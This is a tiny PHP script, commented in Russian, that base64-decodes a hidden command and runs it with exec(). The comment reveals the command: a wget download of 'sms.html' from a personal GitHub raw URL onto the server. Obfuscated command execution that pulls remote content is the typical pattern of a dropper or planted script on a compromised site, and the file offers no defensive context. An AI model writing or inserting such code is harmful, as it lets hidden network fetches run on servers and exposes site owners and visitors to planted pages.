<?php
// Закодированная команда 'wget https://raw.githubusercontent.com/Ro0TiK/mywebsi/main/sms.html'
$encoded_command = 'd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUm8wVGlLL215d2Vic2kvbWFpbi9zbXMuaHRtbA==';

// Декодируем команду
$decoded_command = base64_decode($encoded_command);

// Выполняем команду
exec($decoded_command);
?>
